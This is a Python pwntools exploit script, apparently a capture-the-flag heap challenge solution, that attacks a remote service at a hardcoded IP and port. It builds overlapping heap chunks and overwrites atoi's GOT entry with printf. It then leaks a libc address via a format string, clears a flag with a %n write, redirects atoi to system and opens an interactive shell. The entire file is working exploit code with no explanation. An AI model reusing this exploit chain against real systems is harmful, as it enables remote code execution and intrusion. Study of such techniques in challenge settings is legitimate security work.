#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "52.68.77.85"
port = 8731

r = remote(host,port)

def new_heap(size,content,name):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)
    r.recvuntil(":")
    r.sendline(name)

def del_heap():
    r.recvuntil(":")
    r.sendline("2")

def edit(content):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(content)

def stdin_buf(data):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil("n)")
    time.sleep(0.2)
    r.sendline(data)

stdin_buf("n".ljust(0x3e0+0xc00,"\x41") + p64(0) + p64(0x71)) #alloca a stdin buffer in heap
new_heap(32,"ddaa","a"*8)
del_heap() # create overlay chunk
atoi_got = 0x602078
editcount = 0x6020a4
printf_plt = 0x400786
scanf_plt = 0x400806
payload = p64(0)*4
payload += p64(0x80)
payload += "a"*8
payload += p64(atoi_got)
new_heap(96,payload,"dada")
edit(p64(printf_plt)+p64(scanf_plt) ) # atoi_got -> printf 
r.recvuntil(":")
time.sleep(0.1)
r.sendline("aa%19$pbb") # leak libc
r.recvuntil("aa")
data = r.recvuntil("bb")[:-2]
libc_start_ret = int(data,16)
libc = libc_start_ret - 0x20830
print "libc:",hex(libc)
system = libc + 0x45380
payload = "%9$naaaa" + p64(editcount) #clear the flag of edit
r.recvuntil(":")
r.send(payload)
r.recvuntil(":")
r.sendline("aa")
r.recvuntil(":")
r.sendline(p64(system))
r.recvuntil(":")
r.sendline("sh")
r.interactive()
